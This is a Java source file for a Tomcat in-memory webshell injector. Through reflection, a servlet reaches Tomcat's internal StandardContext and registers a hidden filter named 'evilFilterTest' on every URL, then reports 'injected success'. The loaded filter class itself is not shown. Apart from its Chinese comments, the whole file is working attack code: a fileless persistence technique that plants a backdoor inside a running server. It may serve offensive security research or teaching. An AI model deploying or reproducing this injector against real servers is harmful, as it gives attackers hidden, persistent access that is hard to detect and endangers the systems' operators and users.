package com.filter;

import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

public class AddFilterShell extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

        String filterName = "evilFilterTest";

        //从请求中获取 ServletContext
        ServletContext servletContext = req.getServletContext();

        try {
            //从servlet中获取已经注册的filter，如果不存在要注册的filter再继续
            if (servletContext.getFilterRegistration(filterName) == null) {
                StandardContext standardContext = null;
                // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
                while (standardContext == null) {
                    Field f = null;
                    f = servletContext.getClass().getDeclaredField("context");
                    f.setAccessible(true);
                    Object ob = f.get(servletContext);
                    if(ob instanceof ServletContext){
                        servletContext = (ServletContext) ob;
                    }
                    if(ob instanceof StandardContext){
                        standardContext = (StandardContext) ob;
                    }
                }

                // 创建自定义 Filter 对象
                Class<?> filterClass = DynamicUtils.getClass(DynamicUtils.FILTER_CLASS_STRING);

                // 创建 FilterDef 对象
                FilterDef filterDef = new FilterDef();
                filterDef.setFilterName(filterName);
                filterDef.setFilter((Filter) filterClass.newInstance());
                filterDef.setFilterClass(filterClass.getName());

                // 创建 ApplicationFilterConfig 对象
                Constructor<?>[] constructors = ApplicationFilterConfig.class.getDeclaredConstructors();
                constructors[0].setAccessible(true);
                ApplicationFilterConfig config = (ApplicationFilterConfig) constructors[0].newInstance(standardContext,filterDef);

                // 创建 FilterMap 对象
                FilterMap filterMap = new FilterMap();
                filterMap.setFilterName(filterName);
                filterMap.addURLPattern("*");
                filterMap.setDispatcher(DispatcherType.REQUEST.name());

                // 反射将 ApplicationFilterConfig 放入 StandardContext 中的 filterConfigs 中
                Field fieldConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
                fieldConfigsField.setAccessible(true);
                HashMap<String,ApplicationFilterConfig> filterConfigs = (HashMap<String, ApplicationFilterConfig>) fieldConfigsField.get(standardContext);
                filterConfigs.put(filterName,config);

                // 反射将 FilterMap 放入 StandardContext 中的 filterMaps 中
                Field filterMapField = standardContext.getClass().getDeclaredField("filterMaps");
                filterMapField.setAccessible(true);
                Object obj = filterMapField.get(standardContext);

                Class cls = Class.forName("org.apache.catalina.core.StandardContext$ContextFilterMaps");
                Method method = cls.getDeclaredMethod("addBefore",FilterMap.class);
                method.setAccessible(true);
                method.invoke(obj,filterMap);

                resp.getWriter().write("123\n");
                resp.getWriter().write("injected success");
                resp.getWriter().flush();
            }
        }catch (Exception e){
            System.out.println("error happend");
        }

    }
}
